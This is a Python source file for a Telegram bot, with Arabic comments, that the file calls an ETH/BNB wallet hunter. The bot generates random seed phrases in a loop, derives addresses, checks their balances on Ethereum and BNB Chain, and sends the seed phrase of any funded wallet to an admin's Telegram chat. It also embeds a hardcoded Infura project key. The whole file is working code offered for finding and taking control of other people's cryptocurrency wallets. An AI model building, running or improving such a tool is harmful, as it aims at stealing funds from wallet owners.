import os
import time
import requests
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from mnemonic import Mnemonic
from eth_account import Account
from web3 import Web3

# --- إعدادات من الأسرار ---
TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")

# --- إعدادات الشبكات ---
# استخدمنا Infura كمزود خدمة مجاني للوصول لشبكات البلوك تشين
# يمكنك إنشاء مفتاح خاص بك من infura.io إذا أردت
INFURA_PROJECT_ID = "f253c5b3780f4490956884604ad3a79a" # مفتاح عام ومجاني
ETH_PROVIDER_URL = f"https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}"
BNB_PROVIDER_URL = "https://bsc-dataseed.binance.org/"

# متغيرات عالمية للتحكم في البحث
search_active = False
wallets_checked = 0

# --- وظائف البحث عن المحافظ ---
def search_wallets():
    global search_active, wallets_checked
    
    # تفعيل ميزة إنشاء الحسابات من الكلمات السرية
    Account.enable_unaudited_hdwallet_features()
    
    # الاتصال بالشبكات
    web3_eth = Web3(Web3.HTTPProvider(ETH_PROVIDER_URL))
    web3_bnb = Web3(Web3.HTTPProvider(BNB_PROVIDER_URL))

    send_telegram_message("🔍 بدأت عملية البحث عن (ETH و BNB)...")
    
    while search_active:
        try:
            phrase = Mnemonic("english").generate(strength=128)
            
            # إنشاء عنوان إيثريوم/BNB (كلاهما يستخدم نفس الطريقة)
            account = Account.from_mnemonic(phrase)
            address = account.address
            
            wallets_checked += 1

            # --- 1. فحص رصيد الإيثريوم (ETH) ---
            balance_eth_wei = web3_eth.eth.get_balance(address)
            if balance_eth_wei > 0:
                balance_eth = web3_eth.from_wei(balance_eth_wei, 'ether')
                msg = f"💰 *وجدنا إيثريوم (ETH)!* \n\n*الكلمات:* `{phrase}`\n*العنوان:* `{address}`\n*الرصيد:* `{balance_eth:.6f} ETH`"
                send_telegram_message(msg)

            # --- 2. فحص رصيد بينانس كوين (BNB) ---
            balance_bnb_wei = web3_bnb.eth.get_balance(address)
            if balance_bnb_wei > 0:
                balance_bnb = web3_bnb.from_wei(balance_bnb_wei, 'ether')
                msg = f"🟡 *وجدنا بينانس (BNB)!* \n\n*الكلمات:* `{phrase}`\n*العنوان:* `{address}`\n*الرصيد:* `{balance_bnb:.6f} BNB`"
                send_telegram_message(msg)

            # إرسال تحديث دوري
            if wallets_checked % 1000 == 0:
                send_telegram_message(f"📊 تحديث: تم فحص {wallets_checked} محفظة (ETH/BNB). البحث مستمر...")

            time.sleep(0.5) # فاصل زمني أقصر لأن فحص الرصيد أسرع

        except Exception as e:
            print(f"حدث خطأ في حلقة البحث: {e}")
            time.sleep(10) # انتظار أطول عند حدوث خطأ في الاتصال بالشبكة
            
    send_telegram_message("🛑 توقفت عملية البحث بناءً على طلبك.")

# --- وظائف بوت التليجرام (تبقى كما هي) ---
def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload)
    except Exception as e:
        print(f"فشل إرسال رسالة تليجرام: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("أهلاً بك في بوت صائد (ETH/BNB) 🤖\n\n/search - لبدء البحث.\n/status - لمعرفة الحالة.\n/stop - لإيقاف البحث.")

async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global search_active
    if str(update.message.chat_id) != ADMIN_CHAT_ID: return
    if not search_active:
        search_active = True
        Thread(target=search_wallets).start()
        await update.message.reply_text("✅ *تم إعطاء أمر بدء البحث عن (ETH/BNB).*\nستبدأ العملية في الخلفية الآن.")
    else:
        await update.message.reply_text("⚠️ البحث يعمل بالفعل.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global wallets_checked
    if str(update.message.chat_id) != ADMIN_CHAT_ID: return
    status_msg = "🟢 *الحالة: البحث يعمل.*" if search_active else "🔴 *الحالة: البحث متوقف.*"
    await update.message.reply_text(f"{status_msg}\nتم فحص {wallets_checked} محفظة (ETH/BNB) حتى الآن.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global search_active
    if str(update.message.chat_id) != ADMIN_CHAT_ID: return
    if search_active:
        search_active = False
        await update.message.reply_text("⏳ *تم إعطاء أمر الإيقاف.*")
    else:
        await update.message.reply_text("⚠️ البحث متوقف بالفعل.")

def main():
    print("🚀 البوت (ETH/BNB) يبدأ الآن...")
    if not TOKEN or not ADMIN_CHAT_ID:
        print("خطأ: لم يتم العثور على التوكن أو الـ ID.")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))

    print("البوت جاهز لاستقبال الأوامر...")
    send_telegram_message("✅ البوت (ETH/BNB) بدأ العمل بنجاح على خادم Railway!")
    app.run_polling()

if __name__ == "__main__":
    main()
